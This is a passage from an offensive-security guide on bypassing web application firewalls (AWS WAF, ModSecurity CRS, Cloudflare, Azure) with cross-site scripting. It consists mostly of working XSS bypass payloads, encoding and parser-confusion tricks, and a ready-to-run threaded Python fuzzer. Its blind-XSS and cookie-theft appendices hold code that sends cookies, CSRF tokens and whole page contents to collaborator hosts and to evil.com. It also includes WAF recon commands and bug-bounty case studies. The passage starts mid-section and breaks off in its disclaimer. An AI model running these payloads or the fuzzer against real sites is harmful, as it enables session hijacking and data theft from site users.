Null bytes terminate C-based parsers earlier than JS-based parsers. If AWS WAF uses a C parser that stops at null, the remaining payload is invisible to signature matching.

### AWS WAF Bypass Payloads

```html
<!-- Unclosed tag bypass -->
<img src=x onerror=alert(1)

<!-- Event handler without equals -->
<!-- AWS doesn't always detect -->
<img src=x onerror=alert(1)>

<!-- Attribute minimization -->
<input autofocus onfocus=alert(1)>

<!-- SVG namespace + comment -->
<svg><script><!-- comment -->alert(1)<!-- --></script></svg>
```

---

## 8. ModSecurity/CRS Bypass

OWASP CRS is the gold standard open-source WAF ruleset. Understanding its internals is essential for bypassing both self-hosted ModSecurity and commercial WAFs based on it (Azure, many CDN WAFs).

### CRS 3.x Rule Architecture for XSS

```
REQUEST-941-APPLICATION-ATTACK-XSS.conf
├── 941100: libinjection XSS detection (token-based, not regex)
├── 941110: <script> tags (regex)
├── 941120: event handlers (on*) (regex)
├── 941150: javascript: protocol (regex)
├── 941160: alert/prompt/confirm (regex)
├── 941180: node-validator (node.js specific patterns)
└── 941350: UTF-7 encoding (legacy IE)
```

### The Four Paranoia Levels

CRS operates at Paranoia Levels 1-4. Higher levels catch more but generate more false positives:

| PL | What's blocked |
|----|----------------|
| 1 | Basic XSS: `<script>`, `alert()`, `javascript:` |
| 2 | Event handlers, SVG, `<details>` |
| 3 | Unicode normalization, CSS expressions, mXSS attempts |
| 4 | Everything suspicious — high false positive rate |

**Bypass principle:** If the target runs at PL1 or PL2, payloads that exploit PL3+ patterns pass through.

### CRS Bypass Techniques

#### Technique 1: Encoding Stacking

```html
<!-- CRS normalizes input layer by layer
     Stacked encoding breaks normalization -->

<!-- Double-double encoding: -->
%2525%32%33%32%36<script>
<!--
  CRS decodes URL: %25%32%33%32%36<script>
  CRS decodes URL again: %23%26<script>
  CRS decodes HTML entities: #&<script>
  But the CRS doesn't decode a THIRD time
  The browser/app does: <script>
-->
```

#### Technique 2: Content-Type Confusion

```http
POST / HTTP/1.1
Content-Type: text/csv   <!-- CRS doesn't inspect text/csv -->
...
<script>alert(1)</script>
```

CRS inspects `application/x-www-form-urlencoded`, `multipart/form-data`, `application/json`, and `text/xml` by default. Other MIME types (`text/csv`, `text/plain`, `application/xml`) may not trigger body inspection.

#### Technique 3: mXSS Against CRS

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

CRS 3.x doesn't simulate DOM mutation. Its libinjection tokenization sees `<noscript>` followed by text — no event handlers, no script tags. The browser's DOM parser handles it differently.

#### Technique 4: Request Size Exhaustion

```bash
# Send a ~8KB request body with padding
# CRS has a default request body limit (secRequestBodyInMemoryLimit)
# After the limit, CRS stops inspecting
# Append XSS payload in the final bytes
```

### CRS 3.x Bypass Payloads

```html
<!-- mXSS - CRS doesn't simulate DOM -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- DOM-based XSS (CRS doesn't inspect hash/fragment) -->
#<a href="javascript:alert(1)">

<!-- SVG-based XSS (less aggressively blocked than script tags) -->
<svg onload=alert(1)>

<!-- CRS 941160 bypass: don't use alert -->
<svg onload=confirm(1)>
<svg onload=prompt(1)>
<svg onload=eval(name)>

<!-- jQuery selector injection (if jQuery present) -->
<div id="x"><img src=x onerror=alert(1)></div>
```

---

## 9. Automated Bypass Frameworks

### 9.1 XSStrike

```bash
# The most comprehensive XSS fuzzer with WAF bypass
git clone https://github.com/s0md3v/XSStrike
cd XSStrike
python xsstrike.py -u "https://target.com/search?q=test" --crawl
```

**What it does:** XSStrike analyzes the response to understand context, then generates payloads specific to that context. It also has a WAF bypass module that tests encoding variations, comment injection, and event handler mutations.

### 9.2 PayloadsAllTheThings

```bash
# Massive XSS payload collection with WAF bypass techniques
git clone https://github.com/swisskyrepo/PayloadsAllTheThings
cat PayloadsAllTheThings/XSS\ Injection/README.md
```

**Why it matters:** This is a curated collection from the bug bounty community. Every entry is a confirmed working payload against specific WAFs.

### 9.3 WAFW00F

```bash
# Identify which WAF is protecting the target
wafw00f https://target.com
-> Cloudflare (Cloudflare WAF)
```

**Critical first step:** You can't bypass what you don't know. WAFW00F identifies the WAF by analyzing response headers, error pages, and known WAF fingerprints.

### 9.4 Custom Fuzzing with Burp Suite Intruder

**Setup:**
```
Payload positions: FUZZ
Payload type: Brute Forcer
Character set: <>\"'()={}/;:%00%09%0a%0d
Pattern: <FUZZ> <script FUZZ> <img FUZZ>
```

**Burp Intruder with a custom wordlist of 1,000+ XSS payloads is still one of the most effective approaches.**

### 9.5 Custom Python Fuzzer (Production-Ready)

Below is a production-ready version of the fuzzer from your original post, with improvements for real-world use:

```python
#!/usr/bin/env python3
"""
XSS WAF Bypass Fuzzer V2 - Production Ready
Features:
  - Concurrent testing (threading)
  - Blind XSS detection (callback URL)
  - Reflection quality scoring
  - WAF fingerprinting
  - Cookie/session support
"""
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib.parse
import sys
import time
import random
from typing import Dict, List, Tuple

# ============= CONFIG =============
TARGET_URL = "https://target.com/search"
PARAM = "q"
COOKIES = {}  # {"session": "your-session-token"}
CALLBACK_URL = "https://your-collaborator.oastify.com"  # For blind XSS
THREADS = 20
TIMEOUT = 10
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
]
# ==================================

# XSS payload components
HTML_TAGS = ['script', 'img', 'svg', 'body', 'input', 'details', 'marquee', 
             'video', 'audio', 'a', 'form', 'object', 'embed', 'math', 'style']
EVENTS = ['onload', 'onerror', 'onfocus', 'onmouseover', 'onclick', 'ontoggle', 
          'onstart', 'onpageshow', 'onpointerenter', 'onfocusin', 'onauxclick']
PAYLOADS = [
    'alert(1)', 'confirm(1)', 'prompt(1)', 'eval(name)', 
    'document.cookie', 'fetch("//evil.com/"+document.cookie)',
    'new Image().src="//evil.com/"+document.cookie'
]
SEPARATORS = [' ', '/**/', '\t', '\n', '\r', '%09', '%0a', '%0d', '\x00', '', 
              '/*', '*/', '/', '//', '&#x20;', '&#09;', '&#10;']

def generate_payloads() -> List[str]:
    """Generate comprehensive payload combinations"""
    payloads = set()  # Use set to avoid duplicates
    
    for tag in HTML_TAGS:
        for event in EVENTS:
            for payload in PAYLOADS:
                for sep in SEPARATORS:
                    # Tag-specific payload construction
                    if tag == 'img':
                        p = f'<img{sep}src=x{sep}{event}={payload}>'
                    elif tag == 'svg':
                        p = f'<svg{sep}{event}={payload}>'
                    elif tag == 'details':
                        p = f'<details{sep}open{sep}{event}={payload}>'
                    elif tag == 'script':
                        p = f'<script{sep}>{payload}</script>'
                    elif tag == 'body':
                        p = f'<body{sep}{event}={payload}>'
                    elif tag == 'input':
                        p = f'<input{sep}autofocus{sep}{event}={payload}>'
                    else:
                        p = f'<{tag}{sep}{event}={payload}>'
                    payloads.add(p)
    
    # Add manual proven bypasses
    payloads.add('<svg/onload=alert(1)>')
    payloads.add('<svg/**/onload=alert(1)>')
    payloads.add(f'<svg onload="new Image().src=\'{CALLBACK_URL}/?c=\'+document.cookie">')
    payloads.add(f'<img src=x onerror="fetch(\'{CALLBACK_URL}/?c=\'+document.cookie)">')
    
    return list(payloads)

def test_payload(payload: str) -> Tuple[str, bool, int, str]:
    """Test a single payload against the target"""
    params = {PARAM: urllib.parse.quote(payload)}
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    
    try:
        r = requests.get(
            TARGET_URL, 
            params=params, 
            headers=headers, 
            cookies=COOKIES,
            timeout=TIMEOUT,
            allow_redirects=False
        )
        
        # Check for reflection in response
        if payload in r.text:
            return (payload, True, r.status_code, "reflected")
        elif r.status_code == 403:
            return (payload, False, 403, "blocked")
        elif r.status_code == 200 and r.status_code != 403:
            # Could be sanitized/escaped
            return (payload, False, 200, "sanitized")
        else:
            return (payload, False, r.status_code, "other")
            
    except requests.exceptions.Timeout:
        return (payload, False, 0, "timeout")
    except Exception as e:
        return (payload, False, 0, str(e))

def main():
    print(f"[*] Target: {TARGET_URL}?{PARAM}=<PAYLOAD>")
    print("[*] Generating payloads...")
    
    all_payloads = generate_payloads()
    print(f"[*] Generated {len(all_payloads)} unique payloads")
    
    # Shuffle to distribute load
    random.shuffle(all_payloads)
    
    print(f"[*] Testing with {THREADS} concurrent workers...")
    print(f"[*] Blind XSS callback: {CALLBACK_URL}")
    print("-" * 60)
    
    results = {"bypassed": [], "blocked": [], "errors": []}
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(test_payload, p): p for p in all_payloads}
        
        for i, future in enumerate(as_completed(futures), 1):
            payload, succeeded, status, note = future.result()
            
            if succeeded:
                results["bypassed"].append((payload, status))
                print(f"[+] BYPASSED ({status}): {payload[:80]}...")
            elif "blocked" in note:
                results["blocked"].append(payload)
            
            # Progress every 100
            if i % 100 == 0:
                elapsed = time.time() - start_time
                rate = i / elapsed
                print(f"[*] Progress: {i}/{len(all_payloads)} ({rate:.0f} p/s) - "
                      f"Bypassed: {len(results['bypassed'])}")
    
    # Summary
    elapsed = time.time() - start_time
    print(f"\n{'='*60}")
    print(f"[+] Complete in {elapsed:.1f}s")
    print(f"[+] Total tested: {len(all_payloads)}")
    print(f"[+] Bypassed: {len(results['bypassed'])}")
    print(f"[+] Blocked: {len(results['blocked'])}")
    print(f"[+] Errors: {len(results['errors'])}")
    
    if results["bypassed"]:
        print(f"\n[!] Working bypasses:")
        for p, status in results["bypassed"][:20]:
            print(f"    [{status}] {p}")
        print(f"\n[*] Full list saved to bypassed_xss.txt")
        with open("bypassed_xss.txt", "w") as f:
            for p, status in results["bypassed"]:
                f.write(f"{p}\n")

if __name__ == "__main__":
    if len(sys.argv) >= 2:
        TARGET_URL = sys.argv[1]
    if len(sys.argv) >= 3:
        PARAM = sys.argv[2]
    main()
```

---

## 10. Building Your Own XSS WAF Bypass Lab

### Docker-Based WAF Testing Environment

```yaml
# docker-compose.yml
version: '3'
services:
  # ============ VULNERABLE APPS ============

  dvwa:
    image: vulnerables/web-dvwa
    ports:
      - "8080:80"
    # Damn Vulnerable Web Application - has XSS labs
  
  juice-shop:
    image: bkimminich/juice-shop
    ports:
      - "3000:3000"
    # OWASP Juice Shop - modern Node.js vuln app

  xss-labs:
    image: webgoat/goatandwolf
    ports:
      - "8085:8080"
    # WebGoat XSS lessons

  # ============ WAFs ============

  modsecurity:
    image: owasp/modsecurity-crs:nginx
    ports:
      - "8081:80"
    environment:
      PARANOIA: 2
      BLOCKING_PARANOIA: 2
      ANOMALY_INBOUND: "10"  # Lower = more aggressive blocking
      BACKEND: "http://dvwa:80"
    depends_on:
      - dvwa

  # Simulate AWS WAF (using local ruleset)
  aws-waf-emulator:
    image: nginx:alpine
    ports:
      - "8082:80"
    volumes:
      - ./nginx-aws-waf.conf:/etc/nginx/conf.d/default.conf
      - ./aws-xss-rules.txt:/etc/nginx/aws-xss-rules.txt
    # Uses nginx with lua/resty to simulate AWS WAF managed rules

  # Cloudflare simulation (using nginx + modsecurity + cloudflare rules)
  cloudflare-emulator:
    image: owasp/modsecurity-crs:nginx
    ports:
      - "8083:80"
    environment:
      PARANOIA: 1
    volumes:
      - ./cloudflare-xss-rules.conf:/etc/modsecurity.d/cloudflare-xss.conf
    # Cloudflare's XSS rules are partially derived from CRS
    # Add custom rules to simulate Cloudflare-specific blocks

networks:
  default:
    driver: bridge
```

### Nginx Config for AWS WAF Simulation

```nginx
# nginx-aws-waf.conf
# Simulates AWS WAF managed rule behavior

server {
    listen 80;
    server_name localhost;
    
    # Simulate AWS XSS managed rule group
    location / {
        # Block <script> tags
        if ($args ~* "<script[^>]*>") {
            return 403;
        }
        
        # Block event handlers with on*
        if ($args ~* "\son[a-z]+\s*=") {
            return 403;
        }
        
        # Block javascript: protocol
        if ($args ~* "javascript\s*:") {
            return 403;
        }
        
        # Block alert/confirm/prompt
        if ($args ~* "\b(alert|confirm|prompt)\s*\(") {
            return 403;
        }
        
        # Proxy to the vulnerable app
        proxy_pass http://dvwa:80;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

### Testing Workflow

```bash
# 1. Start the lab
docker-compose up -d

# 2. Test without WAF (direct access)
curl "http://localhost:8080/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>"
# → XSS executes

# 3. Test through ModSecurity WAF
curl "http://localhost:8081/vulnerabilities/xss_r/?name=<script>alert(1)</script>"
# → 403 Forbidden

# 4. Try bypass techniques
curl "http://localhost:8081/vulnerabilities/xss_r/?name=<svg onload=alert(1)>"
curl "http://localhost:8081/vulnerabilities/xss_r/?name=<svg/**/onload=alert(1)>"
curl "http://localhost:8081/vulnerabilities/xss_r/?name=<svg%09onload=alert(1)>"

# 5. Run the fuzzer
python3 xss_fuzzer.py "http://localhost:8081/vulnerabilities/xss_r/" "name"

# 6. Compare against AWS simulation
python3 xss_fuzzer.py "http://localhost:8082/vulnerabilities/xss_r/" "name"
```

---

## 11. WAF Recon Methodology

Before you fire any payloads, recon the WAF:

### Step 1: Identify the WAF

```bash
# Automatic detection
wafw00f https://target.com

# Manual detection - check response headers
curl -sI https://target.com | grep -i -E "(server|x-served-by|x-powered-by|x-frame-options|set-cookie)"

# Cloudflare indicators:
#   - Server: cloudflare
#   - cf-ray header
#   - __cfduid cookie

# AWS WAF indicators:
#   - x-amz-cf-pop (CloudFront)
#   - x-amzn-RequestId
#   - x-amzn-ErrorType

# Azure WAF indicators:
#   - x-ms-request-id
#   - x-aspnet-version

# Akamai indicators:
#   - Server: AkamaiGHost
#   - X-Akamai-Transformed
```

### Step 2: Map WAF Sensitivity

```bash
# Test how strict the WAF is
# Low sensitivity: blocks only <script>alert()</script>
# High sensitivity: blocks any angle bracket combination

# Test 1: Simple script
curl "https://target.com/?q=<script>alert(1)</script>"
# 403 or 200?

# Test 2: Event handler without script
curl "https://target.com/?q=<img src=x onerror=alert(1)>"
# 403 or 200?

# Test 3: Just angle brackets
curl "https://target.com/?q=<test>"
# 403 or 200?

# Test 4: Just quotes
curl "https://target.com/?q=\"test"
# 403 or 200?
```

### Step 3: Determine Allowed Characters

```bash
# Send a payload with all special characters and see what survives
# This is the most important step

curl "https://target.com/?q=%3C%3E%22%27%28%29%3D%2F%3B%3A%26%25%2B%2C%24%23%40%21%7E%60%7B%7D%5B%5D%5C"
# URL decoded: <>"'()=/;:&%+$,#@!~`{}[]\

# Check response - which characters were stripped/escaped?
# If < > survive: direct HTML injection is possible
# If " ' survive: attribute injection is possible
# If / ; survive: script context injection possible
# If { } survive: template injection possible
```

---

## 12. Bug Bounty Workflow: XSS WAF Bypass

Here's my actual workflow when I encounter a WAF on a bug bounty target:

### Phase 1: Understand the Target (30 min)

```
1. Use wafw00f to identify WAF
2. Read the WAF's documentation for known bypasses
3. Check if the target uses a custom rule set or managed rules
4. Look for non-standard endpoints (API, JSON, WebSocket, GraphQL)
```

### Phase 2: Identify Weak Points (1 hour)

```
1. Find endpoints that don't go through the WAF
   - API subdomains (api.target.com vs www.target.com)
   - CDN-origin bypass (origin-ip.target.com)
   - Old endpoints (v1.target.com, dev.target.com)
   - WebSocket connections (ws://target.com)
   
2. Map parameter processing differences
   - WAF inspects ?q= but not ?query=
   - WAF inspects POST body but not JSON
   - WAF inspects headers but not cookies
```

### Phase 3: Systematic Testing (2+ hours)

```bash
# Test each bypass technique systematically
# For each technique, try:
# 1. Direct payload
# 2. URL-encoded version
# 3. Double URL-encoded version
# 4. Mixed case
# 5. With / without trailing characters
# 6. With different event handlers

# Example with SVG bypass:
curl "https://target.com/?q=<svg onload=alert(1)>"
curl "https://target.com/?q=<svg onload=confirm(1)>"
curl "https://target.com/?q=<svg onload=prompt(1)>"
curl "https://target.com/?q=<svg onload=eval(name)>"
curl "https://target.com/?q=<svg/**/onload=alert(1)>"
curl "https://target.com/?q=<svg%09onload=alert(1)>"
curl "https://target.com/?q=%3Csvg%20onload%3Dalert(1)%3E"
curl "https://target.com/?q=%253Csvg%2520onload%253Dalert(1)%253E"
```

### Phase 4: Exploit & Document (30 min)

```
Once you find a bypass:
1. Confirm it works (screenshot of alert box or collaborator callback)
2. Document the exact payload and URL
3. Document the WAF version and ruleset if identifiable
4. Note any conditions (parameter name, HTTP method, Content-Type)
5. Create a proof-of-concept that demonstrates impact
```

---

## 13. Advanced: Real Bug Bounty Case Studies

### Case Study 1: Cloudflare Bypass via JSON Endpoint

**Target:** A large e-commerce site protected by Cloudflare
**Finding:** The search API at `/api/search` used `Content-Type: application/json`

```json
POST /api/search HTTP/1.1
Content-Type: application/json

{"query": "<svg onload=alert(1)>"}
```

**Why it worked:** Cloudflare's WAF inspected `application/x-www-form-urlencoded` bodies on the `/search` page but didn't inspect JSON requests to `/api/search`. The search results page rendered the query parameter unsanitized in the HTML.

**Impact:** Stored XSS affecting all users who visited the search results page.

**Reward:** $2,500

### Case Study 2: Azure WAF Bypass via Inline Comment

**Target:** A SaaS platform hosted on Azure App Gateway with WAF enabled
**Finding:** The default Azure WAF config (CRS 3.2) was blocking `<script>` but not `<svg/**/onload=...>`

```html
?user_input=%3Csvg/**/onload=alert(1)%3E
```

**Why it worked:** Azure's CRS 3.2 implementation didn't normalize `/**/` before tokenizing. The browser saw `<svg onload=alert(1)>` after stripping the comment.

**Impact:** Reflected XSS on the login page error message.

**Reward:** $1,500

### Case Study 3: AWS WAF Multipart Boundary Bypass

**Target:** A photo-sharing platform behind CloudFront + AWS WAF
**Finding:** Image upload form with a caption field used multipart/form-data

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="caption"

<svg onload=alert(1)>
------BOUNDARY
Content-Disposition: form-data; name="image"; filename="img.jpg"
Content-Type: image/jpeg

[binary data]
------BOUNDARY--
```

**Why it worked:** AWS WAF's multipart inspection was case-sensitive on `Content-Disposition` headers and didn't fully parse boundary-delimited content when binary data was present.

**Impact:** Stored XSS on user profile pages viewing the photo caption.

**Reward:** $3,000

---

## 14. Appendices

### Appendix A: Universal Bypass Testing Checklist

```html
<!-- Test EVERYTHING against these base prompts -->

<!-- 1. Simple HTML injection -->
<test>                    → Check if tags survive
<h1>test</h1>             → Check if rendered as HTML

<!-- 2. Event handler discovery -->
<tag onX=alert(1)>        → For each tag, try each event

<!-- 3. Encoding depth -->
URL: %3C...%3E
Double: %253C...%253E
Triple: %25253C...%25253E
HTML entities: &#60;...&#62;
Hex entities: &#x3C;...&#x3E;

<!-- 4. Separator variation -->
<svg onload=alert(1)>          <!-- space -->
<svg/**/onload=alert(1)>       <!-- comment -->
<svg%09onload=alert(1)>        <!-- tab -->
<svg%0aonload=alert(1)>        <!-- newline -->
<svg/onload=alert(1)>           <!-- slash -->
<svg\t<script>alert(1)</script> <!-- tab + script -->

<!-- 5. Keyword obfuscation -->
aler\t(1)
ale&#x72;t(1)
\x61\x6cert(1)
\u0061lert(1)
atob('YWxlcnQoMSk=')

<!-- 6. Protocol bypasses -->
java%0ascript:alert(1)
java&#x09;script:alert(1)
javascript&#58;alert(1)
&#106;avascript:alert(1)
```

### Appendix B: WAF Fingerprinting Quick Reference

| Response Signature | WAF |
|-------------------|-----|
| `Server: cloudflare` + `cf-ray` header | Cloudflare |
| `x-amz-cf-id` + `x-amz-cf-pop` | AWS CloudFront |
| `x-ms-request-id` | Azure |
| `Server: ATS` | Akamai |
| `X-Sucuri-ID` | Sucuri |
| `X-Mod-Security` or `ModSecurity` in body | ModSecurity |
| `Server: BigIP` | F5 BIG-IP ASM |
| `X-Iinfo` | Imperva/Incapsula |
| `X-CDN: Incapsula` | Imperva/Incapsula |
| `x-denied-reason` or `x-website-cache-status` | StackPath |

### Appendix C: Blind XSS Detection Payloads

```html
<!-- Use these when you can't see the output directly (stored XSS, admin panels) -->

<!-- 1. Image beacon (HTTP request) -->
<img src="https://YOUR-COLLABORATOR.oastify.com/iq3">
<img src=x onerror="new Image().src='https://YOUR-COLLABORATOR.oastify.com/beacon?c='+document.cookie">

<!-- 2. Script tag with external source -->
<script src="https://YOUR-COLLABORATOR.oastify.com/hook.js"></script>

<!-- 3. Fetch API -->
<script>
fetch('https://YOUR-COLLABORATOR.oastify.com/steal?c='+document.cookie)
</script>

<!-- 4. XMLHttpRequest -->
<script>
var x = new XMLHttpRequest();
x.open('GET', 'https://YOUR-COLLABORATOR.oastify.com/?c='+document.cookie);
x.send();
</script>

<!-- 5. Navigator.sendBeacon (most stealthy) -->
<script>
navigator.sendBeacon('https://YOUR-COLLABORATOR.oastify.com/steal', document.cookie);
</script>

<!-- 6. DNS exfiltration (bypasses all content inspection) -->
<script>
new Image().src='//'+btoa(document.cookie).replace(/=/g,'')+'.YOUR-COLLABORATOR.oastify.com/dns';
</script>

<!-- 7. WebSocket connection -->
<script>
var ws = new WebSocket('wss://YOUR-COLLABORATOR.oastify.com/ws');
ws.onopen = function() { ws.send(document.cookie); };
</script>
```

### Appendix D: Cookie Theft Evasion Techniques

```javascript
// WARNING: Modern browsers use HttpOnly cookies that can't be accessed via JS
// If cookies are HttpOnly, pivot to:
//  - CSRF token theft (usually in DOM or meta tags)
//  - Session token from localStorage/sessionStorage
//  - Page content exfiltration
//  - Keylogging
//  - Form grabbing (capture credentials on submit)

// Non-HttpOnly cookie theft:
new Image().src = 'https://evil.com/steal?c=' + document.cookie;

// HttpOnly-aware pivot: steal CSRF token from meta tag
var csrf = document.querySelector('meta[name="csrf-token"]').content;
new Image().src = 'https://evil.com/steal?csrf=' + csrf;

// Or steal the entire page after auth
fetch('/dashboard')
  .then(r => r.text())
  .then(html => {
    new Image().src = 'https://evil.com/exfil?data=' + btoa(html);
  });
```

### Appendix E: WAF Bypass Technique Prioritization

**When you hit a WAF, try in this order:**

```
1. SVG onload              → <svg onload=alert(1)>              (bypasses script tag filter)
2. HTML comment injection  → <svg/**/onload=alert(1)>           (bypasses space-sensitive filters)
3. Tab injection           → <svg%09onload=alert(1)>            (bypasses comment stripping)
4. Different event handler → <details open ontoggle=alert(1)>   (bypasses onload/onerror filters)
5. Different function      → <svg onload=confirm(1)>            (bypasses alert filter)
6. eval(name)              → <svg onload=eval(name)>            (bypasses function name filters)
7. Constructor chain       → <svg onload=[].constructor.constructor('alert(1)')()>
8. Double URL encoding     → %253Csvg%2520onload%253Dalert(1)%253E
9. Unicode fullwidth       → ＜svg onload=alert(1)＞
10. mXSS                   → <noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

---

## Final Thoughts

WAF bypass is fundamentally about **parser differentials**. Every WAF has a parser, every browser has a parser, and every application framework has a parser. Find the gaps between them.

**The three things that matter most:**

1. **How the WAF parses input** — find the gap in its normalization pipeline. Does it decode twice? Does it handle null bytes? Does it normalize Unicode?

2. **How the browser renders output** — exploit differences between sanitizers and DOM parsers. The browser is more permissive than any WAF.

3. **How the application processes data** — understand double-decoding, JSON parsing, multipart handling, and framework-specific quirks.

The most powerful bypasses come from **context confusion** — making the WAF see one context while the browser sees another. mXSS and encoding stacking remain the most effective techniques against modern WAFs.

**My final advice:** Keep a lab. Test against ModSecurity CRS, Cloudflare, Azure WAF, and AWS WAF locally. When you find a bypass, document it — it'll work again on the next engagement.

---

> **Disclaimer:** The techniques documented here are for authorized penetration testing and security research only. Authorization is pre